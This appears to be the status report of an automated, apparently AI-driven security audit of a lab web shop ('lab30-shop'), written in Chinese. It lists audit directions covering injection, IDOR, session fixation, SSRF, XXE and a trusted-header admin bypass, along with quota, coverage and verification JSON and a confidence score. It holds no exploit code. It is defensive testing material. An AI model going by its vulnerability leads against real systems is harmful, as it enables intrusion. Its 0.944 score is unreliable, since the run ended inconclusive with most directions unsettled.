受阻、未执行、未读取方向均不代表安全。

- completed · CLI 脚本与未读入口：命令执行、初始化逻辑与客户端信任：
- completed · account/backup.php 导入数据的 base64/unserialize 兼容性与二次利用：
- completed · 账号备份导出与恢复：路径构造和文件写入/读取边界：
- completed · ops 模板/内容/报表链路：模板表达式执行与二次注入：
- completed · 订单链路：单价信任、重复支付与订单归属校验：
- completed · app/src 共享函数：member_lookup / dispatch_job / backup 的注入与越权面：
- completed · 部署层：package.py、compose.yaml、Apache 与 entrypoint 的输入与权限面：
- completed · 会话生命周期与服务身份校验：login/logout 会话固定与 maintenance 头信任：
- completed · 注册与登录会话建立：会话 ID 轮换与 Cookie 属性：
- completed · src 共享辅助函数：SQL 拼接与反序列化注入面：
- completed · ops 目录认证边界与错误回显面复核：
- completed · 钱包与订单：金额/竞态/归属校验与二次注入：
- completed · 订单创建/详情与 partner 门户的对象归属与信任边界：
- completed · support 工单交互：输入汇聚、存储与回显面：
- completed · 认证与会话：密码哈希、会话固定与登录后 ID 未轮换：
- completed · 未读认证入口与前端文件的外部输入与 sink 复核：
- completed · support 消息/下载与 ops 审计日志链路：
- completed · 运维入口剩余脚本：maintenance 信任头、audit-log 与 batch-check 输入流：
- completed · ops 剩余入口：注入、SSRF、XXE 与信息泄露：
- completed · catalog/content/partner/support 回显与外部数据注入面：
- completed · orders 下单/详情：对象归属与客户端可控字段：
- completed · 账户资料与兑换：批量赋值、弱类型比较与 IDOR：
- completed · ops 信任头鉴权、异常信息泄露与 CLI 入口审计：
- completed · 运行配置与 fixture 服务：危险 ini 开关与服务端测试桩的可达风险：
- completed · 运营区未结算端点：异常信息泄露、URL 预览 SSRF 与公式/报告端点：
- completed · resources/views 其余模板输出转义与包含面：
- completed · 会话与 Cookie 角色信任、会话固定复核：
- completed · ops 出站网络与子进程调用面：SSRF 与命令注入复核：
- completed · ops 目录错误回显与鉴权面补查：
- completed · account/orders 对象归属与批量赋值越权复核：
- completed · 共享辅助层：成员查询、派发任务与模板渲染函数的跨文件拼接风险：
- completed · ops/database.php 与 ops/report.php 的异常回显与信息泄露：
- completed · 账户入口：认证、IDOR、会话与业务逻辑：
- completed · bootstrap 共享层与请求输入汇聚点审计：
- completed · 部署脚本与 fixtures：敏感操作与外部输入：
- completed · 模板与视图层：输出转义、模板表达式与包含路径：

## 阶段配额与复核

| 阶段 | 模型请求额度 | 实际使用 | 剩余 |
|---|---:|---:|---:|
| 源码规划与挖掘 | 1230 | 337 | 893 |
| POC 验证 | 250 | 32 | 218 |
| 验证复核与收束 | 120 | 25 | 95 |

阶段配额来源：创建时自定义；静态阶段转入验证的请求：0；最终复核预留：60.0 秒。
未决方向：103；待验证：40；正式复核记录：4；待复核：1。


## 预算与覆盖事实

```json
{
  "execution": {
    "policy_version": "audit-runtime-3",
    "phase": "ended",
    "claim_epoch": 1,
    "state_revision": 1351,
    "run_limits": {
      "responses": 1600,
      "tools": 12000,
      "seconds": 14400
    },
    "run_usage": {
      "responses": 394,
      "tools": 522,
      "seconds": 1640.372
    },
    "run_remaining": {
      "responses": 1206,
      "tools": 11478,
      "seconds": 12759.628
    },
    "active_executions": [],
    "stop_reason": {
      "code": "invalid_output_limit",
      "message": "收束条件未满足，仍存在受阻方向或缺少有效动态验证。"
    },
    "context": {
      "peak_request_bytes": 131861,
      "summary_requests": 0,
      "summary_bytes": 0,
      "compactions": 0,
      "dropped_groups": 0,
      "limit_hits": 0,
      "history_bytes": 393216,
      "phases": {
        "planner_explore": {
          "peak_request_bytes": 119492,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_decision": {
          "peak_request_bytes": 113317,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_publish": {
          "peak_request_bytes": 73367,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_execute": {
          "peak_request_bytes": 131861,
          "requests": 6,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_publish": {
          "peak_request_bytes": 69150,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "poc_execute": {
          "peak_request_bytes": 48041,
          "requests": 6,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "poc_conclude": {
          "peak_request_bytes": 29962,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        }
      }
    },
    "blocked_task_ids": [],
    "poc": {
      "available": true,
      "reason": "ready",
      "message": "隔离 POC runner 已就绪。",
      "checked_at": "2026-10-28T11:00:26.566986+00:00",
      "mode": "auto",
      "target_profile": "lab30",
      "target": "lab30",
      "capabilities": {
        "supported_targets": [
          "lab30"
        ],
        "php": true,
        "python": true,
        "browser": true,
        "verification_contexts": true,
        "identity_preconditions": true,
        "idempotent_jobs": true,
        "idempotent_http_jobs": true,
        "idempotent_browser_jobs": true
      },
      "legacy": false
    },
    "final_summary_available": false,
    "workflow": {
      "version": "discovery-first-v1",
      "stage": "review",
      "source": "explicit",
      "limits": {
        "discovery": 1230,
        "poc": 250,
        "review": 120
      },
      "used": {
        "discovery": 337,
        "poc": 32,
        "review": 25
      },
      "transferred": 0,
      "review_reserved_seconds": 60.0,
      "review_reserved_rounds": 60,
      "discovery_stop": {
        "state": "inconclusive",
        "basis": "收束条件未满足，仍存在受阻方向或缺少有效动态验证。",
        "missing": [],
        "code": null
      },
      "remaining": {
        "discovery": 893,
        "poc": 218,
        "review": 95
      },
      "stage_remaining_seconds": 12759.628
    },
    "verification": {
      "total": 46,
      "pending": 40,
      "verified": 5,
      "reviewed": 4,
      "pending_review": 1
    },
    "directions": {
      "version": "audit-directions-v1",
      "total": 105,
      "pending_total": 58,
      "assigned_total": 45,
      "resolved_total": 0,
      "skipped_total": 2,
      "unsettled_total": 103,
      "complete": false,
      "items": [
        {
          "id": "dir_05bbaab46a4dec1a42aa1acf9de811b5",
          "origin_task_id": "2131cfdbf3884ecba50c49fb923a92dc",
          "origin_task_key": "orders-partner-idor-authz",
          "text": "检查 orders/index.php 是否以会话用户过滤订单列表，确认列表侧不存在同类 IDOR",
          "paths": [],
          "state": "assigned",
          "assigned_task_key": "orders-object-ownership",
          "created_at": "2026-10-28T10:51:14.972445+00:00"
        },
        {
          "id": "dir_06edd38a283cf5adf1cda2390a044ace",
          "origin_task_id": "e1b75b0952b545bfbbcd7070ef9666ef",
          "origin_task_key": "session-and-service-identity",
          "text": "核对 register.php 登录/注册后的会话建立是否同样未轮换 ID，确认会话固定可利用面",
          "paths": [],
          "state": "assigned",
          "assigned_task_key": "unread-auth-frontend",
          "created_at": "2026-10-28T10:42:43.107139+00:00"
        },
        {
          "id": "dir_08505b68ed2eaa13fc29f74d2308697e",
          "origin_task_id": "1bb5df87b8154a8192161f86f350a214",
          "origin_task_key": "ops-db-error-disclosure",
          "text": "审查 ops 目录其余页面是否存在类似的错误/堆栈直接回显",
          "paths": [],
          "state": "assigned",
          "assigned_task_key": "ops-error-surface-followup",
          "created_at": "2026-10-28T10:47:19.392172+00:00"
        },
        {
          "id": "dir_0b42b9d5a1e41ef3ff7903c4e976890f",
          "origin_task_id": "7cad8909f8df4c389eff6479a8429cf1",
          "origin_task_key": "bootstrap-shared-input",
          "text": "lab30-shop/app/public/ops/maintenance.php:3 仅凭 HTTP_X_ADMIN:1 头即通过服务身份校验",
          "paths": [
            "lab30-shop/app/public/ops/maintenance.php"
          ],
          "state": "assigned",
          "assigned_task_key": "ops-error-surface-followup",
          "created_at": "2026-10-28T10:35:10.429514+00:00"
        }
      ],
      "omitted": 99,
      "next_cursor": 4
    },
    "coverage_review": {
      "version": "coverage-review-v1",
      "total": 61,
      "pending_total": 0,
      "pending_paths": [],
      "read_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/assets/app.js",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php",
        "lab30-shop/bin/lab",
        "lab30-shop/bin/package.py",
        "lab30-shop/compose.yaml",
        "lab30-shop/docker/apache.conf",
        "lab30-shop/docker/entrypoint.sh",
        "lab30-shop/docker/php.ini",
        "lab30-shop/fixtures/server.py"
      ],
      "reviewed_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/assets/app.js",
        "lab30-shop/app/public/assets/products.svg",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php",
        "lab30-shop/bin/lab",
        "lab30-shop/bin/package.py",
        "lab30-shop/compose.yaml",
        "lab30-shop/docker/apache.conf",
        "lab30-shop/docker/entrypoint.sh",
        "lab30-shop/docker/php.ini",
        "lab30-shop/fixtures/server.py"
      ],
      "skips": [
        {
          "path": "lab30-shop/app/public/assets/app.js",
          "action": "skip",
          "reason": "客户端静态脚本，已在读记录中核对，不引入服务端 sink；前端校验不作为服务端防护证据。"
        },
        {
          "path": "lab30-shop/app/public/assets/products.svg",
          "action": "skip",
          "reason": "静态图片资源，不含服务端执行逻辑，本任务的漏洞类别不适用于该路径；已由支持模块调用作为展示资源。"
        },
        {
          "path": "lab30-shop/docker/php.ini",
          "action": "skip",
          "reason": "已作为本回合任务 config-and-fixture-sinks 的显式读取目标派发，由 worker 逐指令核对，不在 Planner 侧直接跳过。"
        },
        {
          "path": "lab30-shop/fixtures/server.py",
          "action": "skip",
          "reason": "已作为本回合任务 config-and-fixture-sinks 的显式读取目标派发，由 worker 核对桩代码危险 sink 与部署暴露性。"
        }
      ],
      "complete": true,
      "notice": "已读只表示宿主记录过读取，不证明每行或每种风险已审计；跳过项保留理由，不是安全结论。"
    }
  },
  "coverage": {
    "files_total": 69,
    "files_read": 63,
    "files_with_findings": 42,
    "coverage_ratio": 0.913,
    "read_paths": [
      "lab30-shop/app/bin/reset.php",
      "lab30-shop/app/bin/setup.php",
      "lab30-shop/app/public/account/backup.php",
      "lab30-shop/app/public/account/index.php",
      "lab30-shop/app/public/account/me.php",
      "lab30-shop/app/public/account/profile.php",
      "lab30-shop/app/public/account/redeem.php",
      "lab30-shop/app/public/account/settings.php",
      "lab30-shop/app/public/account/update.php",
      "lab30-shop/app/public/assets/app.css",
      "lab30-shop/app/public/assets/app.js",
      "lab30-shop/app/public/auth/continue.php",
      "lab30-shop/app/public/auth/login.php",
      "lab30-shop/app/public/auth/logout.php",
      "lab30-shop/app/public/auth/register.php",
      "lab30-shop/app/public/catalog/detail.php",
      "lab30-shop/app/public/catalog/greeting.php",
      "lab30-shop/app/public/catalog/index.php",
      "lab30-shop/app/public/content/page.php",
      "lab30-shop/app/public/health.php",
      "lab30-shop/app/public/index.php",
      "lab30-shop/app/public/ops/audit-log.php",
      "lab30-shop/app/public/ops/batch-check.php",
      "lab30-shop/app/public/ops/database.php",
      "lab30-shop/app/public/ops/formula.php",
      "lab30-shop/app/public/ops/index.php",
      "lab30-shop/app/public/ops/jobs.php",
      "lab30-shop/app/public/ops/maintenance.php",
      "lab30-shop/app/public/ops/members.php",
      "lab30-shop/app/public/ops/ping.php",
      "lab30-shop/app/public/ops/report.php",
      "lab30-shop/app/public/ops/template-preview.php",
      "lab30-shop/app/public/ops/template-render.php",
      "lab30-shop/app/public/ops/url-preview.php",
      "lab30-shop/app/public/ops/users.php",
      "lab30-shop/app/public/ops/xml-import.php",
      "lab30-shop/app/public/orders/create.php",
      "lab30-shop/app/public/orders/detail.php",
      "lab30-shop/app/public/orders/index.php",
      "lab30-shop/app/public/partner/portal.php"
    ],
    "unread_hot_modules": [
      {
        "module": "lab30-shop",
        "unread": 6,
        "total": 69
      }
    ],
    "dependency_tree_total": 0,
    "dependency_tree_read": 0,
    "notice": "覆盖统计来自已持久化的 worker 读记录与冻结项目图，不是安全结论，也不能作为 finding 证据；read_paths 最多列 40 条，unread_hot_modules 最多列 12 个，最近 200 次尝试之外的读记录未计入。"
  },
  "directions": {
    "version": "audit-directions-v1",
    "total": 105,
    "pending_total": 58,
    "assigned_total": 45,
    "resolved_total": 0,
    "skipped_total": 2,
    "unsettled_total": 103,
    "complete": false,
    "items": [
      {
        "id": "dir_05bbaab46a4dec1a42aa1acf9de811b5",
        "origin_task_id": "2131cfdbf3884ecba50c49fb923a92dc",
        "origin_task_key": "orders-partner-idor-authz",
        "text": "检查 orders/index.php 是否以会话用户过滤订单列表，确认列表侧不存在同类 IDOR",
        "paths": [],
        "state": "assigned",
        "assigned_task_key": "orders-object-ownership",
        "created_at": "2026-10-28T10:51:14.972445+00:00"
      },
      {
        "id": "dir_06edd38a283cf5adf1cda2390a044ace",
        "origin_task_id": "e1b75b0952b545bfbbcd7070ef9666ef",
        "origin_task_key": "session-and-service-identity",
        "text": "核对 register.php 登录/注册后的会话建立是否同样未轮换 ID，确认会话固定可利用面",
        "paths": [],
        "state": "assigned",
        "assigned_task_key": "unread-auth-frontend",
        "created_at": "2026-10-28T10:42:43.107139+00:00"
      },
      {
        "id": "dir_08505b68ed2eaa13fc29f74d2308697e",
        "origin_task_id": "1bb5df87b8154a8192161f86f350a214",
        "origin_task_key": "ops-db-error-disclosure",
        "text": "审查 ops 目录其余页面是否存在类似的错误/堆栈直接回显",
        "paths": [],
        "state": "assigned",
        "assigned_task_key": "ops-error-surface-followup",
        "created_at": "2026-10-28T10:47:19.392172+00:00"
      },
      {
        "id": "dir_0b42b9d5a1e41ef3ff7903c4e976890f",
        "origin_task_id": "7cad8909f8df4c389eff6479a8429cf1",
        "origin_task_key": "bootstrap-shared-input",
        "text": "lab30-shop/app/public/ops/maintenance.php:3 仅凭 HTTP_X_ADMIN:1 头即通过服务身份校验",
        "paths": [
          "lab30-shop/app/public/ops/maintenance.php"
        ],
        "state": "assigned",
        "assigned_task_key": "ops-error-surface-followup",
        "created_at": "2026-10-28T10:35:10.429514+00:00"
      }
    ],
    "omitted": 99,
    "next_cursor": 4
  },
  "verification": {
    "total": 46,
    "pending": 40,
    "verified": 5,
    "reviewed": 4,
    "pending_review": 1
  }
}
```

### 防御与可信度评分

总分 **0.944**（按可用成分权重归一化，分母 0.6）。

| 成分 | 来源 | 权重 | 取值 | 说明 |
|---|---|---:|---:|---|
| 证据校验通过率 | 本次运行 | 0.2 | 1.000 | 70/70 条候选通过源码证据校验 |
| POC 验证通过率 | 本次运行 | 0.2 | 0.833 | 5/6 次自动验证判为已验证 |
| Planner 复核通过率 | 本次运行 | 0.2 | 1.000 | 4/4 条复核确认观测支持结论 |
| 注入抵抗率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |
| 证据链完整率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |

未计入成分：injection、chain（缺失时不按 0 分代入）。
